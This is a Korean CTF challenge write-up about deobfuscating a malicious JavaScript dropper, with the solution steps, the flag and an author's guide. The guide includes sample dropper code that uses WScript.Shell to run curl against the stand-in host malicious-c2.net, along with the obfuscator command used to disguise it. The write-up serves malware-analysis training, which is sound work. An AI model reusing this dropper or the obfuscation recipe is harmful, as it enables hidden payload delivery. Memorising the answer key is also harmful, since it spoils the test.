---
title: 악성 스크립트 난독화 해제 (Javascript Obfuscated Payload)
created: 2026-06-28
updated: 2026-06-28
type: ctf-challenge
tags: [ctf, ctf-challenge, forensics, javascript, deobfuscation, nodejs, malware-analysis]
confidence: high
---

# 악성 스크립트 난독화 해제 (Javascript Obfuscated Payload)

> **난이도**: 초중급  
> **소요 시간**: 25~30분  
> **참고 picoCTF 문제**: 악성 웹/시스템 스크립트 정적 및 동적 디버깅 (Javascript 난독화 해제 기술)

## 1. 배경 시나리오
보안 사고 의심자의 다운로드 디렉터리에서 유포 파일명이 `payment_check.js`로 위장된 악성 자바스크립트 스크립트 파일이 확보되었습니다. 이 파일은 내부 기밀 데이터를 외부 C2 서버로 전송하는 드로퍼(Dropper) 역할을 수행한 것으로 추정됩니다. 분석을 위해 파일을 텍스트 에디터로 열었으나, 변수명이 무작위 헥스값으로 변조되고 대규모의 인코딩 배열 스트링과 복호화 루프가 삽입되어 있어 코드가 완전히 난독화(Obfuscated)되어 있었습니다. 정적/동적 디버깅 기법을 사용해 난독화를 해제하고 **최종 통신한 C2 주소 및 플래그**를 알아내야 합니다.

## 2. 제공 파일
* `payment_check.js` (JS Obfuscator 툴로 고도 난독화된 자바스크립트 파일)

## 3. 문제 목표
대중적인 자바스크립트 난독화 기법(문자열 배열화, 배열 회전, 해독 래퍼 함수)의 구조적 특징을 이해하고, 소스 코드 내 디코드 루프의 성격을 파악한 뒤, 브라우저 콘솔 또는 안전한 Node.js 디버거 환경에서 해독 함수를 호킹하여 최종 실행 페이로드(플래그)를 복구해 냅니다.

## 4. 의도한 풀이 흐름
1. **정적 난독화 유형 판별**:
   * `payment_check.js` 코드를 살펴봅니다.
   * 첫 부분에 거대한 아스키/헥스 문자열 배열 `var _0x5f3a = ['\x68\x74\x74\x70...', ...]`이 선언되어 있고, 그 아래에 배열의 순서를 특정 횟수만큼 회전(Shift)시키는 자가 호출 익명 함수(IIFE), 그리고 이어서 인덱스를 받아 디코딩 문자를 돌려주는 해독 래퍼 함수 `var _0x4c2a = function(_0x2e1a, _0x1c3b) { ... }` 구조가 존재함을 식별합니다. 이는 전형적인 `javascript-obfuscator`의 문자열 은닉 패턴입니다.
2. **복호화 메커니즘 역추적**:
   * 소스 파일의 최하단부 실제 실행 블록에서는 문자열 평문이 모두 `_0x4c2a('0x5')` 등의 래퍼 함수 호출로 대체되어 있습니다.
   * 이 해독 과정을 역추적하기 위해 스크립트를 직접 노드 환경에서 구동하여 분석하거나, 해독 래퍼 함수의 출력을 가로채도록 조작합니다.
3. **디버깅 콘솔을 활용한 난독화 해제 (Deobfuscation)**:
   * **동적 실행 (안전한 샌드박스 내부)**:
     * 악성 외부 통신 및 시스템 공격 명령어(예: `eval`, `WScript.Shell`, `child_process.exec` 등)가 실행되지 않도록 코드 하부의 실행부(오브젝트 호출 위치)를 `console.log`로 치환하는 래퍼 패치를 진행합니다.
     * 코드를 수정합니다: `eval(_0x3b21)` -> `console.log(_0x3b21)`
   * Node.js 환경에서 스크립트를 실행합니다:
     `node payment_check.js`
   * 화면에 복원되어 출력된 원본 텍스트 명령 코드를 획득합니다:
     `var target_url = "http://malicious-c2.net/payload?flag=picoCTF{javascr1pt_deobfuscation_done}";`
4. **플래그 확인**: 출력된 평문 변수에서 플래그 문자열을 추출합니다.
   (최종 플래그: `picoCTF{javascr1pt_deobfuscation_done}`)

## 5. 정답(플래그) 규칙 및 예시
* **플래그 형식**: `picoCTF{<flag_string>}`
* **예시**: `picoCTF{javascr1pt_deobfuscation_done}`

## 6. 출제자 노트 & 파일 제작 가이드
* **아티팩트 제작 방법**:
  1. 먼저 원본 평문 자바스크립트 코드 `source.js`를 작성합니다:
     ```javascript
     var target_url = "http://malicious-c2.net/payload?flag=picoCTF{javascr1pt_deobfuscation_done}";
     var shell = new ActiveXObject("WScript.Shell");
     shell.Run("cmd.exe /c curl " + target_url);
     ```
  2. 온라인 또는 로컬 CLI 도구인 `javascript-obfuscator` 패키지를 설치하고 난독화를 수행합니다:
     `javascript-obfuscator source.js --output payment_check.js --string-array true --string-array-encoding hex`
  3. 변환된 `payment_check.js` 파일이 실행 흐름에 지장을 주지 않는 수준인지 최종 검수하여 분석용 아티팩트로 배포합니다.
* **출제 포인트**: 
  * 침해 시스템에서 획득한 악성 스크립트(JS, VBS, Powershell)의 자동화 분석을 우회하기 위해 적용되는 다양한 코드 난독화 이론을 실증하고, 이를 해독하기 위한 정적 디컴파일 및 안전한 동적 실행 기법을 습득하게 합니다.

## 7. 트러블슈팅 및 힌트
* **Q. 코드를 node로 실행했더니 아무 일도 안 일어나거나 에러가 납니다.**
  * A. 윈도우 스크립트 호스트 환경(`WScript`)이나 브라우저 DOM 객체(`window`, `document`) 의존성을 가진 코드는 순수 Node.js 환경에서 에러를 뿜으며 실행이 종결될 수 있습니다. 이럴 때는 소스 코드 상단에 빈 뼈대 목 객체(Mock Object, 예: `var WScript = { CreateObject: function() {} };` 등)를 정의해 주어 에러를 방지한 뒤 실행 흐름을 제어해야 합니다.
* **Q. 문자 배열을 수동으로 하나하나 치환하기 너무 어렵습니다. 자동 도구가 있나요?**
  * A. AST(Abstract Syntax Tree) 분석 기법을 사용하는 온라인 도구인 **JSNice**나 **deobfuscate.io**, 또는 바벨(Babel) 플러그인 스크립트를 사용하여 디코더 루프의 실행 결과를 정적으로 사전 평가 및 치환하여 자동으로 아주 깨끗한 소스 코드로 역환원할 수 있습니다.

## 8. 학습 포인트
* **자바스크립트 난독화 구조**: 코드 보안성 강화를 빌미로 악용되는 문자열 숨김, 제어 흐름 왜곡(Control Flow Flattening), 불투명 술어(Opaque Predicate) 등의 기술적 메커니즘을 학습합니다.
* **추상 구문 트리(AST) 분석**: 자바스크립트 가상 머신(V8 등)이 텍스트 소스를 기계어로 해석하기 전 파싱하는 구문 분석 구조를 이해하고, 이를 역으로 이용해 정적 평탄화(Deobfuscation) 코드를 설계하는 기초 능력을 기릅니다.
